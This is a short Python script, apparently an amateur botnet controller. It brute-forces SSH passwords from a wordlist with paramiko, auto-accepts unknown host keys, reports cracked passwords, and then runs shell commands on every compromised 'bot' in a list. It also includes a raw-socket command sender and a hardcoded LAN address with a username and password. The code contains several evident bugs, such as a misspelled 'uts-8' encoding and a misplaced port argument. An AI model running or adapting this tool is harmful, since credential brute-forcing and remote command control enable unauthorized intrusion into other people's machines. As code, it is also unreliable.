import paramiko
import os
import socket

def sendCommand(HOST, PORT, COMMAND):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(COMMAND)
    data = s.recv(2)
    s.close()
    return data.decode("uts-8")

def commandSHH(Host, port, username, password, command):
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.load_system_host_keys() 
    ssh.connect(Host, 22, username, password)
    sshin, shhout, ssherr = ssh.exec_command(command)
    
    return shhout.read()
class bot:

    def __init__(self, host, user, passwd, ssh, port = 22):
        try:
            if ssh:
                
                if passwd:
                    test = commandSHH(host, port, user, passwd, "ls")
                    if test:
                        self.host = host
                        self.user = user
                        self.passwd = passwd
                        self.port = port
                        self.ssh = 1
                else:
                    passwordAttempts = 0
                    for password in open("List.txt").readlines():
                        passwordAttempts += 1
                        try:
                            print(commandSHH(host, 22, user, password, "ls"))
                            print("[!]Password Cracked.", password)
                            test = commandSHH(host, port, user, password, "ls")
                            if test:
                                self.host = host
                                self.user = user
                                self.passwd = password
                                self.port = port
                                self.ssh = 1
                            self = bot(host, user, password, 1, 22)
                            
                        except Exception as e:
                            print(password, "is not the password. Attempts:", passwordAttempts, e)
            else:
                
                if sendCommand(host, port, "cd"):
                    self.host = host
                    self.port = port
                    self.type = 1
        except Exception as e:
            print("Error:", e)
    def botnetCommand(self, command):
        try:
            if self.ssh:
                if commandSHH(self.host, self.port, self.user, self.passwd, command):
                    print("Output from", self.host, ":")
                    print(commandSHH(self.host, self.port, self.user, self.passwd, command)) 
                else:
                    print("No output from:", self.host)
        except Exception as e:
            print(e)
jamollenkamp = bot("192.168.1.106", "jamollenkamp", "iyy7y9y9", 22)
botnet = [jamollenkamp]

def commandBotnet(command):
    for computer in botnet:
        computer.botnetCommand(command)

commandBotnet("ls")